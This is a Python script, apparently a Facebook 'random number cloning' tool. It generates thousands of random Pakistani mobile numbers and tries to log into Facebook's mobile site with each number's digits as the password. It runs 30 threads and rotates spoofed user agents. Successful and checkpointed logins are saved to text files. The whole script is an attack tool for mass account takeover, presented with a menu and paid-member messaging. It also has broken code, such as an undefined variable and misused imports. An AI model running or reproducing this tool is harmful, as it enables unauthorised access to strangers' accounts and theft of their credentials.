#!/usr/bin/python3
from imp import reload
import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
import token
from xml.dom import NotFoundErr
from site import main
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError


os.system("rm -rf .txt")
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print (nmbr)
    sys.stdout.flush()
pass

l1="100078"
l2="100079"

g='\x1b[1;92m'
r='\x1b[1;91m'
w='\x1b[1;97m'
y='\x1b[1;93m'
n='\x1b[1;94m'
gu='\x1b[1;95m'
sm='\x1b[1;96m'

try:
    import lolcat
except:
    os.system('pip2 install lolcat')
logo="""                                                                                                                                                                                                     
                                                       bbbbbbbb           bbbbbbbb                                                                                                               dddddddd
   SSSSSSSSSSSSSSS      tttt                           b::::::b           b::::::b                                                                           SSSSSSSSSSSSSSS   iiii              d::::::d
 SS:::::::::::::::S  ttt:::t                           b::::::b           b::::::b                                                                         SS:::::::::::::::S i::::i             d::::::d
S:::::SSSSSS::::::S  t:::::t                           b::::::b           b::::::b                                                                        S:::::SSSSSS::::::S  iiii              d::::::d
S:::::S     SSSSSSS  t:::::t                            b:::::b            b:::::b                                                                        S:::::S     SSSSSSS                    d:::::d 
S:::::S        ttttttt:::::ttttttt    uuuuuu    uuuuuu  b:::::bbbbbbbbb    b:::::bbbbbbbbb       ooooooooooo   rrrrr   rrrrrrrrr   nnnn  nnnnnnnn         S:::::S            iiiiiii     ddddddddd:::::d 
S:::::S        t:::::::::::::::::t    u::::u    u::::u  b::::::::::::::bb  b::::::::::::::bb   oo:::::::::::oo r::::rrr:::::::::r  n:::nn::::::::nn       S:::::S            i:::::i   dd::::::::::::::d 
 S::::SSSS     t:::::::::::::::::t    u::::u    u::::u  b::::::::::::::::b b::::::::::::::::b o:::::::::::::::or:::::::::::::::::r n::::::::::::::nn       S::::SSSS          i::::i  d::::::::::::::::d 
  SS::::::SSSSStttttt:::::::tttttt    u::::u    u::::u  b:::::bbbbb:::::::bb:::::bbbbb:::::::bo:::::ooooo:::::orr::::::rrrrr::::::rnn:::::::::::::::n       SS::::::SSSSS     i::::i d:::::::ddddd:::::d 
    SSS::::::::SS    t:::::t          u::::u    u::::u  b:::::b    b::::::bb:::::b    b::::::bo::::o     o::::o r:::::r     r:::::r  n:::::nnnn:::::n         SSS::::::::SS   i::::i d::::::d    d:::::d 
       SSSSSS::::S   t:::::t          u::::u    u::::u  b:::::b     b:::::bb:::::b     b:::::bo::::o     o::::o r:::::r     rrrrrrr  n::::n    n::::n            SSSSSS::::S  i::::i d:::::d     d:::::d 
            S:::::S  t:::::t          u::::u    u::::u  b:::::b     b:::::bb:::::b     b:::::bo::::o     o::::o r:::::r              n::::n    n::::n                 S:::::S i::::i d:::::d     d:::::d 
            S:::::S  t:::::t    ttttttu:::::uuuu:::::u  b:::::b     b:::::bb:::::b     b:::::bo::::o     o::::o r:::::r              n::::n    n::::n                 S:::::S i::::i d:::::d     d:::::d 
SSSSSSS     S:::::S  t::::::tttt:::::tu:::::::::::::::uub:::::bbbbbb::::::bb:::::bbbbbb::::::bo:::::ooooo:::::o r:::::r              n::::n    n::::n     SSSSSSS     S:::::Si::::::id::::::ddddd::::::dd
S::::::SSSSSS:::::S  tt::::::::::::::t u:::::::::::::::ub::::::::::::::::b b::::::::::::::::b o:::::::::::::::o r:::::r              n::::n    n::::n     S::::::SSSSSS:::::Si::::::i d:::::::::::::::::d
S:::::::::::::::SS     tt:::::::::::tt  uu::::::::uu:::ub:::::::::::::::b  b:::::::::::::::b   oo:::::::::::oo  r:::::r              n::::n    n::::n     S:::::::::::::::SS i::::::i  d:::::::::ddd::::d
 SSSSSSSSSSSSSSS         ttttttttttt      uuuuuuuu  uuuubbbbbbbbbbbbbbbb   bbbbbbbbbbbbbbbb      ooooooooooo    rrrrrrr              nnnnnn    nnnnnn      SSSSSSSSSSSSSSS   iiiiiiii   ddddddddd   ddddd
                                                                                                                                                                                                         
 Author : Zero"""                                                                                                                                                                                       ""
dec="2"
server="2"


rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header= {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent":rsauser, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
reload(sys)
sys.getdefaultencoding()



fuck=[]
idx=[]
oks=[]
cps=[]


def main_apv():
    try:
        r=requests.get('https://graph.facebook.com/me?access_token=' + token)
        q=json.loads(r.text)
        m=q['name']
        print ('')
    except requests.exceptions.ConnectionError:
        print (logo)
        print ('')
        print ("Turn On Data An Then \t")
        print("")
    except:
        print ('\x1b[1;91mToken on Checkpiont ')
        os.system('rm -rf token.txt')
        os.system('clear')
    print (logo)
    print ("")
    print (39*'~')
    print ("\x1b[1;91m[1]   Random Cloning     \x1b[1;92m (No Login)")
    print ("\x1b[1;94m[2]   Check Subscription ")
    print ("\x1b[1;95m[3]   Update Tools")
    print ("\x1b[1;96m[4]   For Any Help Massage WhatsApp")
    print (43*'~')
    print ("\x1b[1;92m[*] \x1b[1;95m For Need Any Help Type 7 And Massage Me On \x1b[1;92mWhatsApp ")
    print (43*'~')
    main_input()
def main_input():
    mx=int(input('\x1b[1;92m[!] Select : '))
    print ("")
    if mx==int('1'):
        print ("")
        print('\033[1;94m Checking Subscription ....\033[1;97m')
        time.sleep(3)
        numcloning()
    elif mx==int('2'):
        os.system ('clear')
        print (logo)
        print ("")
        print ("")
        print ("")
        print ("")
        print ("        Congratulations Bro Your Pro")
        print ("        Member In Mohsin Paid Commands ")
        print ("        ENJOY  KRO BHI (logo) ")
        time.sleep(3.5)
        main()
    elif mx==int('3'):
        os.system("git clone https://github.com/EmadSid14/numcln.git")
        os.system("rm -rf numcln")
        os.system("cp -f numcloning/numcln \\.")
        os.system("rm -rf numcln")
        time.sleep(5)
        mx("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
        time.sleep(2)
			
			
    elif mx==int('4'):
        os.system("xdg-open https://wa.me/+923312104709")
        time.sleep(3)
        main()
        
        
    else:
        print ('invild option')
        time.sleep(2)
        main()

def numcloning():
    global input
    if dec in server:
        pass
    else:
        NotFoundErr()
    ra=[]
    cps=[]
    oks=[]
    os.system ("clear")
    print (logo)
    print ("")
    print ("    \033[1;91m\n[ Pakistan Random Number Cloning ]")

    print ("")
    print ('\033[1;92m\n   [*] Enter First 4 Digits Of Any Network : ')
    print ("\033[1;93m\n     Example 0300 0345 0320 0303 ")
    print ("")
    coc=input('\033[1;95m\nChoice Code :\033[1;93m ')
    try:
        list = '.txt'
        for li in open(list, 'r').readlines():
            ra.append(li.strip())
    except (KeyError, IOError):
        print ("File Missing")
        time.sleep (2)
        main()
    print ("")
    print ("\033[1;93m\n[*] Total Ids : " +str(len(ra)))
    print ("")
    os.system('echo " ------------------------------------"| lolcat')
    print ("  CRACKING START PLEASE WAIT FOR IDS..   ")
    print ("IF IDS NOT COMMING USE (airplane) FLIGHT MOD")
    os.system('echo " ------------------------------------"| lolcat')
    def main(arg):
        user = arg
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", 
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = user
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': coc+user, 'pass': pass1, 'login': 'submit'})
            
            if 'c_user' in rana.cookies.get_dict().keys():
                print ("\x1b[1;92m[RK-OK] "+coc+user + " | " + pass1)
                ok=open('RK-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(cid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    
                    print ("\x1b[1;91m[RK-CP] "+coc+user + " | " + pass1)
                    cp=open('RK random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(cid+pass1)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, ra)
    print ("\x1b[1;97m")
    print (40*'-')
    print ("[!] Cloning Complete Been Completed ........")
    print (40*'-')
    print ('[!] Total Ok Ids : ' +str(len(cps)))
    print ('[!] Total Cp Ids : ' +str(len(oks)))
    print (40*'-')
    print ('')
    input=(' Press Enter To Back ')
    main_input()

if __name__=='__main__':
    main_apv()